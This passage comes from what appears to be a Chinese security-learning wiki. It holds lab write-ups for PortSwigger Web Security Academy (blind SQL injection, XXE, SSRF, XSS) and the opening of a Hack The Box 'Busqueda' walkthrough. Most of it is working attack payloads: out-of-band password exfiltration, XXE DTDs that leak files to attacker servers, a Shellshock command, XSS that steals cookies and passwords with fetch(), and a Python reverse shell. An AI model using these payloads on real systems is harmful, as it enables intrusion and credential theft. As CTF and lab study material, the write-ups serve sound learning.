(1=1)）是否为真，接收到错误的时候为真（1/0），即确定存在管理员字段administrator case when (1=1) then to_char(1/0) else '' end -- 1/0 会导致错误 CASE表达式可以在 SQL 中实现if-then-else型的逻辑 case when 判断语句1 then 返回1 when 判断语句2 then 返回2 …… else 返回n end 密码的长度 '||(select case when length(password)&gt;1 then to_char(1/0) else '' end from users where username='administrator' )||' – 500，条件（条件是密码长度大于 1）为真返回错误 最后确认密码 同样是使用SUBSTR()函数从密码中提取单个字符 '||(select case when substr(password,1,1)='a' then to_char(1/0) else'' end from users where username='administrator')||' case when substr(password,1,1)='a' then to_char(1/0) else '' end 输出 http 状态码为 500 的时候，说明找到了密码 administrator th7zlh5neuj8mfp5eu4e 具有时间延迟的盲 SQL 注入 首先确定数据库是哪个 '||(select sleep(10))-- ' --&gt; '||(select pg_sleep(10))-- ' --&gt; 发现需要 10s 的响应时间 select tracking-id from tracking-table where trackingid='pvhzsNX3X3hoWEpS'||(select pg_sleep(10))-- '; 具有时间延迟和信息检索的盲SQL注入 查看是否存在 SQL 注入 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 验证需要 10s 的延迟 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 不延迟 %3b 是为了关闭初始查询，亦即; URL Decode 是否存在用户 administrator x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明存在 administrator 确认密码长度 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明密码长度大于 1，后续直接 send to intruder，最后获知长度为 20 确认密码 依旧是使用SUBSTRING()函数，不再一一述说了 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users-- 带外交互的盲 SQL 注入 目的为利用 SQL 注入漏洞并导致 DNS 查找 用 bp 获得域名，点击左上角的“Burp Collaborator client”， mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com ' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') EXTRACTVALUE函数接受一个XMLType实例和一个XPath表达式作为参数，并返回结果节点的标量值。 带外数据泄露的盲 SQL 注入 依旧是上个题目的套路 ' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(SELECT password FROM users WHERE username='administrator')||'.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- 通过 XML 3编码绕过过滤器的 SQL 注入 需要装一个插件 Hackvertor。使用说明Hackvertor-Github","tags":[null,null],"categories":[null]},{"title":"Portswigger 靶场之 XML 外部实体 (XXE) 注入","path":"/wiki/portswigger/xml-external-entity-attack.html","content":"All labs | Web Security Academy (portswigger.net) 1. Exploiting XXE using external entities to retrieve files 使用外部实体利用 XXE 来检索文件 检查库存功能用 burp 截断数据包，然后松手在 HTTP History 中查看请求，转到 Repeater。 往下看，当看到 XML 的时候，应该考虑 XXE 注入。接下来就是找到注入点，具体位置有两个，一个是 productId，另一个是 storeId。 在 XML 声明和元素 stockCheck 之间插入外部实体定义。 &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; # 定义了一个名为 xxe 的实体，它指向文件系统中的 /etc/passwd 文件。 2. Exploiting XXE to perform SSRF attacks 利用 XXE 执行 SSRF 攻击 依旧是抓包检查库存功能，会发现有一个包含 XML 的帖子请求。 声明一个外部实体，不再引用本地文件而是查看是否可以发送到 IP 地址169.254.169.254 Send 发送请求，从响应中得到目录，连续往下遍历目录，最后获得敏感信息。 3. Blind XXE with out-of-band interaction 带外交互的盲 XXE 访问产品页面，单击“检查库存”并在 Burp 中拦截请求。 定义外部实体，插入 Burp 的协作子域名。转到“子域名”选项卡，然后单击“Poll now”。 可以看到 DNS 和 HTTP 交互。它的作用是，确认我们可以让应用程序与攻击者控制的对话服务器，为带外渗透做好准备 &lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; ]&gt; 4. Blind XXE with out-of-band interaction via XML parameter entities 通过 XML 参数实体进行带外交互的盲 XXE 外带交互的盲 XXE 是通过利用 XML 解析器向==外部服务器（burp 子域）==发送数据，使得攻击者可以==通过外部服务器与目标系统进行交互==。 &lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; %xxe; ]&gt; # 定义了一个名为 xxe 的参数实体，它指向一个远程 URL http://…… # 使用了 % 操作符来引用实体，%xxe --&gt; 表示引用实体xxe # XML 文档被解析时，实体引用（%xxe; ）将会被展开并替换为实体声明中的值（也就是远程 URL），而可能导致系统被攻击者控制的服务器接管。 Quote / 参考 盲XXE（Blind XXE），它可以在没有直接访问应用程序响应的情况下，仍能从应用程序中获取敏感信息。 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD 利用盲 XXE 使用恶意外部 DTD 泄露数据 &lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt; &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/?x=%file;'&gt;&quot;&gt; %eval; %exfil; # 定义了一个名为 file 的外部实体，它包含了 /etc/hostname 文件的内容。可以利用此实体来访问并泄露目标系统中的文件内容 # 这一行定义了一个名为 eval 的外部实体，它包含了一个实体声明 exfil，该实体可将 file 实体的内容发送到攻击者控制的服务器。exfil实体的定义包括一个URL，该URL包含攻击者控制的服务器地址和将file实体的内容作为查询参数的字符串。在这种情况下，exfil实体将文件内容发送到http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/，并将file实体的内容作为查询参数x的值。 # %eval; %exfil; 这两行将eval实体和exfil实体插入到XML文档中。攻击者可以将这些实体插入到一个合法的XML文档中，并发送给目标系统进行解析。在解析XML文档时，目标系统将解析eval实体，然后解析exfil实体，从而触发将file实体的内容发送到攻击者控制的服务器的行为。 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体 最后返回 Burp Collaborator client，会看到一些 DNS 和 HTTP 交互，特别关注 HTTP 交互，可能包含文件的内容。/etc/hostname &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a57006c0302b2d5c0e221d8013c0082.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; 6. Exploiting blind XXE to retrieve data via error messages 利用盲 XXE 通过错误消息检索数据 &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;&quot;&gt; %eval; %exfil; 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体，会看到一条包含文件内容错误消息 &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a42007304c1c092c003856801a900e4.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; # 定义了一个名为 foo 的 DTD 声明，其中包含了一个名为 xxe的 外部实体。 # xxe 实体的定义包括一个 URL，该 URL 指向服务器上的一个文件，文件包含敏感信息。在这种情况下，可以将获取的信息发送到 https…… 7. Exploiting XInclude to retrieve files 利用 XInclude 检索文件 抓包检查库存功能，修改 productId 的值 &lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt; # 这个XML文档定义了一个名为foo的元素，并且通过XML命名空间定义了一个名为xi的前缀，它的命名空间是&quot;http://www.w3.org/2001/XInclude&quot;。然后，它使用了`xi:include`元素来指定要包含的内容，包括`parse`和`href`属性。 # parse属性指定了包含的文件是以文本方式解析的，而不是XML方式解析。href属性指定了要包含的文件的路径，这里是file:///etc/passwd，也就是本地系统上的/etc/passwd文件。由于该文件包含有关用户帐户的信息，因此攻击者可以使用这种技术来收集系统信息并进行其他攻击。 8. Exploiting XXE via image file upload 通过图像文件上传利用XXE 下载一个SVG 文件（注意不要太大），上传 SVG 文件，发表评论的时候抓包，修改 SVG 文件的内容 Expand / 拓展 SVG 文件是由 XML 构成的，因此可以使用 XML 的各种功能来嵌入数据或 payload 到 SVG 图像中。由于 SVG 图像可以包含文本、图形和脚本等元素，因此可以使用这些元素来嵌入payload &lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt; # 当SVG文件被处理时，xxe实体会被解析为文件/etc/hostname的内容，然后将该内容作为文本元素的内容插入到SVG图像中，从而显示该文件的内容。 9. Exploiting XXE to retrieve data by repurposing a local DTD 利用 XXE 通过重新调整本地 DTD 的用途来检索数据 抓包检查库存功能 &lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso ' &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; %local_dtd; ]&gt; # 定义名为“file”的实体，并将其设置为/etc/passwd文件的路径，然后通过将这个实体插入到另一个名为“eval”的实体中，最终触发了漏洞，导致可以读取系统上的/etc/passwd文件的内容。同时，攻击者也定义了一个名为“error”的实体，用于报告错误信息。","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 SSRF 篇","path":"/wiki/portswigger/ssrf.html","content":"All labs | Web Security Academy (portswigger.net) 1. 针对本地服务器的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**更改 URL 来访问http://localhost/admin并删除用户carlos 分析： URL 浏览到 /admin 目录返回一个错误，指出该目录仅可从服务器本地使用，或对已登录的管理员可用。 找到库存检查功能，打开 burp 进行拦截并发送到 repeater，库存将发出与后端 API 通信的请求。在 burp 中观察到有个参数是stockApi，有 http 字样，判断为编码后 URL。通过 Ctrl+Shift+U 对 URL 解码后，能够看到库存检查功能的 URL 路径和端口号。 查看是否有应用程序在本地主机上运行，将stockApi值换为http://localhost，发送后显示成功，点开 burp 的 Render，能够看到网站页面上有Admin panel字样，说明进入了管理面板 在 Response 中搜索 admin，可看到Admin panel的路径是/admin，把路径添加到 stockApi 上后，继续在 Response 中搜索 carlos，可看到删除的路径是/admin/delete?username=carlos 删除 carlos：http://localhost/admin/delete?username=carlos，遵循 302 重定向 检查库存功能 对 URL 进行解码 访问本地 找到了删除的路径 返回查看成功 2. 针对另一个后端系统的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**SSRF 扫 IP 并删除用户carlos 分析： 通过 burp suite 在库存检查功能处抓包，发送到Intruder，对 IP 地址的最后一位“添加有效载荷 §”，type 填 Number，From 1 To 255 Step 1，然后 Start attack。 攻击完后通过 Status 排序，找到不一致的发送到 Repeater，在最后面添加/admin 在 Response 中搜索 carlos，可看到删除的路径是admin/delete?username=carlos 对 URL 编码后发送，遵循 302 重定向，返回即可看到已成功http://192.168.0.18:8080/admin/delete?username=carlos 通过 python 3. 带有基于黑名单的输入滤波器的 SSRF 易受攻击的参数是： 库存检查功能 目标： 访问 http://localhost/admin 的管理界面并删除用户carlos 分析： 打开 burp 抓包，修改参数为http://localhost/失败了，然后修改为http://127.0.0.1也失败了，再次修改为http://127.1，因为会自动填充缺少的两位八位字节，点击发送发现渲染出来了 这说明，没有对127.1进行正则匹配（所以设置白名单比黑名单更好） 还可以把 IP 地址进行 16 进制编码或者 8 进制 16 进制 --&gt; 7F000001 10 进制 --&gt; 2130706433 后面加入/admin，发送后失败了在 burp 中右击Convert selection对 admin 进行编码，或者大小写绕过，最后找到路径直接删除用户即可 测试 http://127.1 大小写绕过 两次 URL 编码 4. 通过开放重定向漏洞旁路过滤器的 SSRF 要点： Open redirect 分析： 抓包库存检查功能和Next produst并发送到 Repeater，重命名为 Check stock、Next product 在 Next product 中通过测试 path 参数，观察到 path 参数被放置在Location响应标头中，Location 响应标头表示 URL 需要重定向页面 应用程序先验证 stockAPI 参数的 URL 是否在允许的域中，紧接着应用程序请求 URL，触发重定向，遵循重定向，向攻击者构造的内部 URL 发出请求 stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos 拦截 重定向 重定向到管理界面 重定向到删除 5. 带外检测的盲 SSRF 在加载产品页面时用 burp 抓包，找到 Referer 标头，开启 Collaborator client 把网址替换为 Referer 6. 带有基于白名单的输入滤波器的 SSRF 要点： 利用 URL 解析中的不一致性来绕过过滤器 步骤： 首先发出请求http://loaclhost，发现响应告诉我们主机名必须是stock.weliketoshop.net 使用@在主机名之前的 URL 中嵌入凭据，参数改为http://127.0.0.1@stock.weliketoshop.net 使用两次 URL 编码后的#使 @stock.weliketoshop.net 失效。#代表网页中的一个位置，位置的标识符 发出请求http://127.0.0.1%2523@stock.weliketoshop.net即可成功。后面步骤与之前面没有差别了 7. 盲目 SSRF 与壳冲击利用 **要点：**SSRF 在 Referer， UA 带 Shell shock payload 步骤： 从 BApp Store 安装“Collaborator Everywhere”扩展，把域名添加到 Burp，以便 Collaborator Everywhere 观察 回到浏览器，浏览产品页面后点击 return，如此反复，由此产生 HTTP 交互，回到 burp，观察 HTTP 请求中的 User-Agent，并发送到 Intruder 使用 Burp Collaborator 客户端，更改 Referer 标头，http://192.168.0.1:8080 IP 地址的最后一个八位字节，添加 § () &#123; :; &#125;; /usr/bin/nslookup $(whoami).yac7iwqg4tsdlyai7czxo0rrcii96y.oastify.com Payloads 窗口，将 payload 类型为 Numbers，1、255、1，开始攻击 攻击完成后，回到 Burp Collaborator 客户端，点击 Poll now，能够看到 DNS 交互和操作系统用户的名称 需要输入操作系统用户的名称即可成功 安装 添加域名 观察 UA 攻击 利用 python","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 XSS 篇(上)","path":"/wiki/portswigger/xss-part1.html","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 &lt;script&gt;alert(1)&lt;/script&gt; 2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区 3. 文档中的 DOM XSS.使用 source location.search 编写接收器 在搜索查询功能中有基于 DOM 的跨站点脚本漏洞 在搜索框输入&quot;第三个&quot;，可以发现，输入的词被放到了 JavaScript 代码中的 img 标签的 src 属性中，插入 XSS 代码的话需要先闭合，使用&quot;&gt; `，分别闭合 img 标签和 src 属性 // 在页面输入&quot;第三个&quot; &lt;img src=&quot;/resources/images/tracker.gif?searchTerms=第三个&gt; // 插入 XSS 代码第一种方法 &quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt; &lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt; &quot;&gt; // 插入 XSS 代码第二种方法 // 语法：onload，事件在页面载入完成后立即触发，onload=&quot;JavaScriptCode&quot; 1&quot; onload=&quot;alert(3) &lt;img src=&quot;/resources/images/tracker.gif?searchTerms=1&quot; onload=&quot;alert(3)&quot;&gt; // 源代码 function trackSearch(query) &#123; document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+query+'&quot;&gt;'); &#125; 搜索框输入“第三个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 4. 使用 source location.search in innerHTML sink 中的 DOM XSS。 // 在页面输入&quot;第四个&quot; &lt;span id=&quot;searchMessage&quot;&gt;第四个&lt;/span&gt; // 插入 XSS 代码第一种方法 // 语法：onload，当页面载入完毕后执行 Javascript 代码，该事件不可取消 &lt;svg onload=alert(4)&gt; &lt;span id=&quot;searchMessage&quot;&gt;&lt;svg onload=&quot;alert(4)&quot;&gt;&lt;/svg&gt;&lt;/span&gt; // 插入 XSS 代码第二种方法 // 语法：onerror，当资源加载失败或无法使用时，触发onerror事件，因为前面的 src 为空，那意味着肯定会触发事件 &lt;img src='' onerror=&quot;alert(4)&quot;&gt; 搜索框输入“第四个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 5. 使用 location.search source 在 jQuery 锚点 href 属性接收器中的 DOM XSS Href 不仅可以跳转路径，也可以放入 JS 代码 https://0a0000b103823255c2ce2cd0003e00a5.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie) 在 a 标签中 在 a 标签中注入 XSS 代码 6. 在 jQuery 选择器中使用 hashchange 事件的 DOM 型 XSS HTML 内联框架元素 (&lt;iframe&gt;) ，它能够将另一个 HTML 页面嵌入到当前页面中。 https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&lt;img src=1 onerror=alert(1)&gt; // 官方给的答案： &lt;iframe src=&quot;https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&quot; onload=&quot;this.src+='&lt;img src=x onerror=print(6)&gt;'&quot;&gt;&lt;/iframe&gt; // 源代码 $(window).on('hashchange', function()&#123; var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); &#125;); 直接在网址注入 服务器中修改 body 7. 带尖括号编码的反射型 XSS 尖括号被编码，但是引号没有，在搜索框输入内容后，发现输入的内容展示在了 input 标签的 value 属性中。 onmouseover 属性在鼠标指针移至元素之上时触发，几乎可使用于所有 HTML 元素，也就不限于搜索框input 内容在 input 标签的 value 属性中 输入 \"onmouseover=\"alert(7) 8. 将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中 评论中输入的内容会成为 a 标签 herf 属性的值 输入 123 查看出于什么位置 javascript:alert(8) 9. 将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中 输入ABC 发现是出现在了 script 标签中，尝试闭合弹出 var searchTerms = 'ABC'; document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'&quot;&gt;'); 构造 Payload';alert(9);// 输入 123 查看出于什么位置 ';alert(9);// PRACTITIONER 10. 文档中的 DOM XSS.使用源位置编写接收器.在选择元素内搜索 注入&amp;storeId=&lt;script&gt;alert()&lt;/script&gt; var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('&lt;select name=&quot;storeId&quot;&gt;'); if(store) &#123; document.write('&lt;option selected&gt;'+store+'&lt;/option&gt;'); &#125; for(var i=0;i&lt;stores.length;i++) &#123; if(stores[i] === store) &#123; continue; &#125; document.write('&lt;option&gt;'+stores[i]+'&lt;/option&gt;'); &#125; document.write('&lt;/select&gt;'); 输入 ABC 查看出于什么位置 11. AngularJS 表达式中的 DOM XSS，带有尖括号和双引号HTML 编码 Angular 是一个前端框架，&#123;&#123; ... &#125;&#125; 里头其实就是一个模板表达式，Angular 会对其进行求值并转化为字符串输出。可以放入 JavaScript 脚本 [PayloadsAllTheThings-Github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/XSS in Angular.md) 注入：&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125; Constructor 是一个构造函数 12. 反射式 DOM XSS 13. 存储型 XSS replace()，如果第一个参数是字符串，则仅替换第一个匹配项 function escapeHTML(html) &#123; return html.replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;'); &#125; // 源代码中，通过 replace() 函数，替换第一个匹配项，也就是&lt;&gt; // &amp;lt;代表小于号（&lt;）; &amp;gt;代表大于号（&gt;）","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 XSS 篇(下)","path":"/wiki/portswigger/xss-part2.html","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 14. 利用跨站点脚本窃取 cookie 在 burp 中使用 Burp Collaborator Client，点击 copy to clipboard。 同时提交博客评论，修改 Burp Collaborator 子域名。 脚本的功能：查看评论的人发出 POST 请求以及 读取 cookie。 &lt;script&gt; fetch('https://qe8bejkmbudhod20kznmpm8v5mbcz1.oastify.com', &#123; method: 'POST', mode: 'no-cors', body:document.cookie &#125;); &lt;/script&gt; // document.cookie --&gt; JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。 回到 Burp Collaborator，单击“Poll now”，以便看到 Http 交互从而找到 Cookie 值进行替换 刷新 Home 主页，在 Burp Repeater 中，Cookie 替换 Send 发送 15. 利用跨站点脚本捕获密码 依旧是在 burp 中使用 Burp Collaborator Client 功能，点击 copy to clipboard。然后评论博客注入脚本（查看评论的话，会发出包含其用户名和密码的 POST 请求）。 回到 Burp Collaborator，单击“Poll now”，找到用户名和密码进行登录即可 &lt;input name=username id=username&gt; &lt;input type=password name=password onchange=&quot;if(this.value.length)fetch('https://6pwdbg28z2wmxtzpbexotcyig9mzao.oastify.com',&#123; method:'POST', mode: 'no-cors', body:username.value+':'+this.value &#125;);&quot;&gt; // onchange 事件 --&gt; 当用户改变input输入框内容时执行一段Javascript代码： administrator:2vlk8eidq808je5v2p8v 16. 利用 XSS 执行 CSRF 先进行登录，在更新电子邮件的位置审查元素，会发现存在 CSRF Token，修改电子邮件获取 CSRF Token 的值 将以下脚本写入博客评论中 &lt;script&gt; var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() &#123; var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\\w+)&quot;/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&amp;email=test@test.com') &#125;; &lt;/script&gt; 17. 将 XSS 反射到 HTML 上下文中，大多数标签和属性被阻止 插入 XSS &lt;img src=1 onerror=print()&gt; 发现失败了，用 burp 抓包发送到 Burp Intruder 测试哪些标签和属性被阻止，先清除标签Clear §，然后将搜索词的值换为&lt;§§&gt;，在 XSS 备忘单点击Copy tags to clipboard 在 Burp Intruder 的 Payloads 选项卡中，单击“Paste”粘贴。点击“start attack”。看到了 body 和custom tags 响应 200，于是知道了 body 没有过滤 继而将搜索词的值换为&lt;body%20§§=1&gt;，在 XSS 备忘单点击Copy events to clipboard Clear 删除之前的 Payload，paste 粘贴刚复制的，点击“start attack”，发现 onresize 响应 200 // 在 Go to exploit server 的 body 中 &lt;iframe src=&quot;https://0a3600a6032533acc04d05d10149009f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width='100px'&gt; // search=&quot;&gt;&lt;body onresize=print()&gt;&quot; --&gt; search=%22%3E%3Cbody%20onresize=print()%3E&quot; 18. 将 XSS 反射到 HTML 上下文中，除了自定义标签外，所有标签都被阻止 自定义标记 XSS &lt;script&gt; location = 'https://0ac80018037267b7c24cf04d00d300df.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; &lt;/script&gt; // search=&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x'; 19. 允许带有一些 SVG 标记的反射型 XSS 根据标题，测试一下是否可以用 &lt;svg&gt;。搜索框中输入 &lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt; // onBegin() (当元素周期开始时由 onbegin 事件立即触发) 20. 规范链接标签中反映的 XSS https://0ad700e904e18a69c0580c0a00f50068.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) %27accesskey=%27x%27onclick=%27alert(1) --&gt; 'accesskey='x'onclick='alert(1) 21. 将 XSS 反射为带有单引号和反斜杠转义的 JavaScript 字符串 输入&lt;script&gt;alert(1)&lt;/script&gt;发现（图一） 于是直接使用两个弹窗123&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&lt;script&gt;alert(1)&lt;/script&gt;（图二） （图一） （图二） 22. 将 XSS 反映到带有尖括号和双引号的 JavaScript 字符串中 HTML 编码和单引号转义 输入后的东西会先被 HTML 编码，然后再被 URL 编码 // 弹窗 &lt;script&gt;alert(1)&lt;/script&gt; // Html 编码 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; // Url 编码 %26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B // encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。 注意到\\没有进行编码 123\\'+alert(1); // 23. 将 XSS 反映到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中 Unicode 转义 HTML 解码： http://aaa&amp;apos;+alert(1)+&amp;apos; --&gt; http://aaa'+alert(1)+' &amp;apos; 进行 Html 解码后是 ' http://aaa&amp;apos;+alert(1)+&amp;apos; EXPERT 24. 带有事件处理程序和 href 属性的反射型 XSS 被阻止 模板字符串 - JavaScript | MDN (mozilla.org) $&#123;alert(1)&#125; 25. 在 JavaScript URL 中反映了 XSS 并阻止了一些字符 &lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=&quot;javascript:alert(1)&quot; dur=1s repeatCount=2 /&gt;&lt;text x=20 y=20&gt;Click Me&lt;/text&gt;&lt;/a&gt; 26. 反射 XSS 与 AngularJS 沙箱转义没有字符串 // 问题点 angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) &#123; $scope.query = &#123;&#125;; var key = 'search'; $scope.query[key] = '123'; $scope.value = $parse(key)($scope.query); &#125;); https://0ae600a2036e6b38c13fc17000230068.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 27. 使用 AngularJS 沙箱转义和 CSP 的反射 XSS &lt;script&gt; location='https://0a140035033feb4dc106573801c300c2.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; &lt;/script&gt; 28. 受非常严格的 CSP 保护的反射型 XSS，带有悬挂标记攻击 目的是需要修改被害者的 Email 变成 hacker@evil-user.net 需要取 CSRF Token，然后 CSRF PoC 放入 Token，修改邮箱地址…… 30. 受 CSP 保护的反射型 XSS，绕过 CSP 预期解决方案只能在 Chrome 中使用。 https://0a2a00f0049fa705c2fbc4b600460008.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27 // 搜索search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27 //URL 解码后 &lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem 'unsafe-inline' // unsafe-inline 允许使用内联资源 // script-src-elem CSP 内容安全性策略 CSP: script-src-elem - HTTP | MDN (mozilla.org)","tags":[null,null],"categories":[null]},{"title":"Busqueda — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/Busqueda.html","content":"连接 https://app.hackthebox.com/machines/Busqueda 参考： 靶场笔记-HTB Busqueda - FreeBuf网络安全行业门户 htb busqueda wp要点记录_春猿火的博客-CSDN博客 https://www.youtube.com/watch?v=I2n4SDUXEYI https://ratil.life/hack-the-box-busqueda/ https://blog.213.se/busqueda-hackthebox/ sudo openvpn lab_Wreath0690.ovpn 10.10.11.208 侦查 # 初始端口扫描 nmap -A 10.10.11.208 # 系统——Ubuntu Searcher 2.4.0 容易受到命令注入的攻击 反弹 shell Google 搜索： “Searchor” poc vulnerabilty exploit “Searchor” exploit POC https://github.com/jonnyzar/POC-Searchor-2.4.2 # 易受攻击的代码包括 eval() 方法： url = eval( f&quot;Engine.&#123;engine&#125;.search('&#123;query&#125;', copy_url=&#123;copy&#125;, open_web=&#123;open&#125;)&quot; ) ', exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);&quot;))# engine=Ask&amp;query=', exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.8',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 